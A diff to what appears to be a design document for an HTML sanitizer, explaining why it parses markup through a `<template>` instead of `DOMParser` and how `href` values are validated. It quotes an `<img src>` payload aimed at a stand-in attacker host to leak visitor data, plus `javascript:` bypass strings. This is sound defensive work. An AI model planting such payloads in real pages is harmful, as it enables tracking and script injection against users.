@@ -964,10 +964,20 @@ Five properties are load-bearing:
   sanitizer — parse, then remove what you dislike — lets anything it failed to think of survive, which is
   what every historical bypass is a variation on. Here nothing survives by default, which is why `on*`,
   `style`, `id` and `ping` need no enumeration. `ownerDocument` is asserted in the tests to pin this.
-- **`DOMParser` is the parse step because it is inert**: no script execution AND no resource loads, unlike
-  `innerHTML` on a detached element, which is script-inert but still fetches `<img src>`.
-  `Utils.sanitizeInput()` already used it, and stays as it is — for a CSS class name or an id, "strip
-  everything" remains correct, and it is not part of this path.
+- **The parse goes through a `<template>`, NOT through `DOMParser`, and the difference is subresources.**
+  Both mark `<script>` non-executable, so both are safe against script execution. But MDN is explicit that
+  a `DOMParser` document "can download resources specified in `<iframe>` and `<img>` elements", so an
+  `<img src="https://attacker.test/log?…">` in a response would hit the network at parse time — leaking
+  the visitor's IP and user agent — even though the element is discarded microseconds later and never
+  rendered. A `<template>`'s `content` belongs to the template contents owner document, which has no
+  browsing context, so nothing in it is fetched. This is the primitive DOMPurify parses into.
+  **This was got wrong on the first pass**: the original comment asserted `DOMParser` fetched nothing,
+  which is the kind of confident-and-wrong security note that stops the next reader from checking.
+  **jsdom cannot test it** — it performs no subresource loading at all, so a unit test passes under either
+  implementation. `SanitizeHtml.test.js` therefore pins the PRIMITIVE (spying that
+  `DOMParser.prototype.parseFromString` is never called), which is implementation-coupled on purpose,
+  since no assertion about the output can see this. `Utils.sanitizeInput()` still uses `DOMParser` and is
+  deliberately unchanged: it sanitizes CONSUMER-supplied class names and ids, not API markup.
 - **`href` is validated by PARSING, never by prefix-matching.** `href.startsWith( 'javascript:' )` is
   defeated three ways, all pinned in the tests: `JaVaScRiPt:`, `java\tscript:` (the HTML parser strips
   tabs and newlines from attribute values), and leading whitespace. `new URL()` normalizes exactly as the
